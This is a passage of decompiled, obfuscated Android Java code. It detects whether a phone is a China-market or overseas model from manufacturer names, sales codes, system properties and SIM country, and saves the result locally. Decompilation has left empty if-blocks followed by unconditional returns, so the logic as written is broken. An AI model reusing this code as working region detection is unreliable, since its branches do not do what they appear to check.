        if (AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "honor", false) || AbstractC0779a1.m213652a5(lowerCase, "hihonor", false) || AbstractC0779a1.m213652a5(lowerCase, "hinova", false) || AbstractC0779a1.m213652a5(lowerCase2, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase2, "honor", false)) {
            String strM212441b68 = m212441b6("ro.build.version.emui");
            if (strM212441b68 != null) {
                String lowerCase5 = strM212441b68.toLowerCase(locale);
                t60.m214694b5(lowerCase5, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (AbstractC0779a1.m213652a5(lowerCase5, "global", false)) {
                }
                return true;
            }
            if (m212441b6("ro.build.version.magic") != null && (strM212441b6 = m212441b6("ro.build.hw_countrycode")) != null) {
                String upperCase5 = strM212441b6.toUpperCase(locale);
                t60.m214694b5(upperCase5, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                if (!upperCase5.equals("CN")) {
                }
                return true;
            }
            String strM212441b69 = m212441b6("ro.build.hw_countrycode");
            if (strM212441b69 != null) {
                String upperCase6 = strM212441b69.toUpperCase(locale);
                t60.m214694b5(upperCase6, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                if (!upperCase6.equals("CN")) {
                    return true;
                }
            }
            return false;
        }
        String lowerCase6 = null;
        if (AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false)) {
            String strM212441b610 = m212441b6("ro.vivo.product.overseas");
            if (!t60.m214686a2(strM212441b610, "1")) {
                if (strM212441b610 != null) {
                    lowerCase3 = strM212441b610.toLowerCase(locale);
                    t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                } else {
                    lowerCase3 = null;
                }
                if (!t60.m214686a2(lowerCase3, "true")) {
                    if (!t60.m214686a2(strM212441b610, "0")) {
                        if (strM212441b610 != null) {
                            lowerCase6 = strM212441b610.toLowerCase(locale);
                            t60.m214694b5(lowerCase6, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                        }
                        if (!t60.m214686a2(lowerCase6, "false") && (strM212441b62 = m212441b6("ro.vivo.product.country")) != null) {
                            String upperCase7 = strM212441b62.toUpperCase(locale);
                            t60.m214694b5(upperCase7, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                            if (AbstractC0134bh.m210734f7(new String[]{"CN", "CHN", "CHINA"}).contains(upperCase7)) {
                            }
                        }
                    }
                    return false;
                }
            }
            return true;
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "samsung", false)) {
            String strM212441b611 = m212441b6("ro.csc.sales_code");
            if (strM212441b611 == null && (strM212441b611 = m212441b6("ril.sales_code")) == null) {
                strM212441b611 = m212441b6("ro.csc.country_code");
            }
            if (strM212441b611 != null) {
                String upperCase8 = strM212441b611.toUpperCase(locale);
                t60.m214694b5(upperCase8, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                if (!AbstractC0134bh.m210734f7(new String[]{"CHC", "CHN", "CHM", "CHU", "CTC", "CMC", "CUH", "TEC", "TIY", "M00"}).contains(upperCase8)) {
                    return true;
                }
            } else {
                String str4 = Build.PRODUCT;
                t60.m214694b5(str4, "PRODUCT");
                String lowerCase7 = str4.toLowerCase(locale);
                t60.m214694b5(lowerCase7, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (!AbstractC0779a1.m213652a5(lowerCase7, "_cn", false) && !AbstractC0779a1.m213655a8(lowerCase7, false, "zc")) {
                    AbstractC0779a1.m213655a8(lowerCase7, false, "zh");
                    return false;
                }
            }
            return false;
        }
        try {
            Object systemService = this.f53209a1.getSystemService("phone");
            telephonyManager = systemService instanceof TelephonyManager ? (TelephonyManager) systemService : null;
            if (telephonyManager == null || (simCountryIso = telephonyManager.getSimCountryIso()) == null) {
                upperCase = null;
            } else {
                upperCase = simCountryIso.toUpperCase(locale);
                t60.m214694b5(upperCase, "this as java.lang.String).toUpperCase(Locale.ROOT)");
            }
        } catch (Exception e3) {
            e3.getMessage();
        }
        if (upperCase != null && upperCase.length() != 0) {
            if (upperCase.equals("CN")) {
            }
            return true;
        }
        if (telephonyManager != null && (networkCountryIso = telephonyManager.getNetworkCountryIso()) != null) {
            lowerCase6 = networkCountryIso.toUpperCase(locale);
            t60.m214694b5(lowerCase6, "this as java.lang.String).toUpperCase(Locale.ROOT)");
        }
        if (lowerCase6 == null || lowerCase6.length() == 0 || !lowerCase6.equals("CN")) {
            String str5 = Build.DISPLAY;
            t60.m214694b5(str5, "DISPLAY");
            Locale locale2 = Locale.ROOT;
            String lowerCase8 = str5.toLowerCase(locale2);
            t60.m214694b5(lowerCase8, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            String str6 = Build.PRODUCT;
            t60.m214694b5(str6, "PRODUCT");
            String lowerCase9 = str6.toLowerCase(locale2);
            t60.m214694b5(lowerCase9, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            String str7 = Build.FINGERPRINT;
            t60.m214694b5(str7, "FINGERPRINT");
            String lowerCase10 = str7.toLowerCase(locale2);
            t60.m214694b5(lowerCase10, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (!AbstractC0779a1.m213652a5(lowerCase8, "global", false) && !AbstractC0779a1.m213652a5(lowerCase9, "global", false) && !AbstractC0779a1.m213652a5(lowerCase8, "international", false) && !AbstractC0779a1.m213652a5(lowerCase9, "international", false) && !AbstractC0779a1.m213652a5(lowerCase10, "/global/", false)) {
                String strM212441b612 = m212441b6("ro.build.display.wtcountrycode");
                if (strM212441b612 != null) {
                    String upperCase9 = strM212441b612.toUpperCase(locale2);
                    t60.m214694b5(upperCase9, "this as java.lang.String).toUpperCase(Locale.ROOT)");
                    if (!upperCase9.equals("CN")) {
                    }
                }
            }
            return true;
        }
        return false;
    }

    /* renamed from: c0 */
    public final boolean m212460c0() {
        String str = Build.MANUFACTURER;
        t60.m214694b5(str, "MANUFACTURER");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.BRAND;
        t60.m214694b5(str2, "BRAND");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str3 = Build.MODEL;
        t60.m214694b5(str3, "MODEL");
        String lowerCase3 = str3.toLowerCase(locale);
        t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        boolean z = AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase2, "huawei", false);
        boolean z2 = AbstractC0779a1.m213652a5(lowerCase, "hinova", false) || AbstractC0779a1.m213652a5(lowerCase2, "hinova", false);
        boolean z3 = AbstractC0779a1.m213652a5(lowerCase, "honor", false) || AbstractC0779a1.m213652a5(lowerCase2, "honor", false);
        boolean z4 = AbstractC0779a1.m213652a5(lowerCase, "hihonor", false) || AbstractC0779a1.m213652a5(lowerCase2, "hihonor", false);
        boolean z5 = AbstractC0779a1.m213652a5(lowerCase, "wiko", false) || AbstractC0779a1.m213652a5(lowerCase2, "wiko", false);
        boolean z6 = AbstractC0779a1.m213652a5(lowerCase3, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase3, "honor", false);
        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("🔍 [华为检测] manufacturer=", lowerCase, ", brand=", lowerCase2, ", model=");
        sbM41c2.append(lowerCase3);
        String string = sbM41c2.toString();
        String str4 = this.f55146a3;
        t60.m214714d6(str4, string);
        t60.m214714d6(str4, "🔍 [华为检测] isHuawei=" + z + ", isHinova=" + z2 + ", isHonor=" + z3 + ", isHihonor=" + z4);
        return z || z2 || z3 || z4 || z5 || z6;
    }

    /* renamed from: c6 */
    public final void m212461c6(boolean z) {
        try {
            this.f53209a1.getSharedPreferences("device_region", 0).edit().putBoolean("is_overseas", z).putLong("detect_time", System.currentTimeMillis()).putString("brand", Build.BRAND).putString("model", Build.MODEL).apply();
            new Thread(new RunnableC0449ea(this, z, 1)).start();
        } catch (Exception e) {
            e.getMessage();
        }
    }

    /* renamed from: c7 */
    public final void m212462c7(boolean z) {
        this.f55149a6 = z;
        t60.m214704c5(this.f55148a5, "[Yw5xud] 授权进行中状态: " + z + " (自动保护" + (z ? "已禁用" : "已启用") + ")");
    }
}
